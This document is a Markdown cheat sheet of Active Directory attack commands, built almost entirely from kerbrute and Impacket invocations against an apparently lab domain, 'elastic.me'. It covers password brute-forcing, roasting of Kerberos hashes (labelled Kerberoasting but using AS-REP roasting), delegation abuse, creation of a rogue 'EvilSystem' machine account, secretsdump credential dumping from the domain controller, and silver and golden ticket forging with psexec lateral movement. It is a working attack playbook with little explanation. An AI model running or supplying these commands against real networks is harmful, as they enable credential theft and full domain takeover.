

###  User Enumeration
A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

```
python3 kerbrute.py -users /root/user.txt -passwords /root/Passwords.txt -domain elastic.me -dc 172.16.100.10

```
### Kerberoasting  
```
python3 GetNPUsers.py elastic.me/John:123456789aA -dc-ip 172.16.100.10 -request
python3 GetNPUsers.py elastic.me/John:123456789aA -dc-ip 172.16.100.10 -request -outputfile Hash.out


```
### DC User List
```
python3 GetADUsers.py elastic.me/administrator:P@ssw0rd -all -dc-ip 172.16.100.10 
```
### Kerberos Delegation
```
python3 findDelegation.py elastic.me/Administrator:P@ssw0rd -dc-ip 172.16.100.10 
```
### Constrained Delegation
```
python3 getST.py -spn time/User02.elastic.me -impersonate Administrator elastic.me/John:123456789aA

```
### Resource-Based Constrained Delegation
```
python3 addcomputer.py -method SAMR -computer-name EvilSystem -computer-pass P@ssw0rd elastic.me/User02:123456789aA
```

### Ticket Granting Ticket
Ticket Granting Ticket is issued by Domain Controller to authenticated user to request Service like CIFS etc.Generally TGT Ticket is encrypted with krbtgt password.

```
python getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 Domain/User
```
```
python3 secretsdump.py elastic.me/Administrator:P@ssw0rd@172.16.100.10 -just-dc-ntlm 
python3 secretsdump.py elastic.me/Administrator:P@ssw0rd@172.16.100.10 -user-status  
python3 secretsdump.py elastic.me/Administrator:P@ssw0rd@172.16.100.10 -just-dc
```
### Silver Ticket
```
python3 ticketer.py -nthash e19ccf75ee54e06b06a5907af13cef42 -domain-sid S-1-5-21-1074588311-525384757-4248492600-500 -domain elastic.me -spn time/User02.elastic.me John
```

### Golden ticket
```
python3 ticketer.py -nthash e19ccf75ee54e06b06a5907af13cef42  -dc-ip 172.16.100.10  -domain-sid S-1-5-21-1074588311-525384757-4248492600-500 -domain elastic.me evil
export KRB5CCNAME=evil.ccache
python3 psexec.py elastc.me/evil@ELASTIC.elastic.me -k -no-pass -target-ip 172.16.100.10 
```
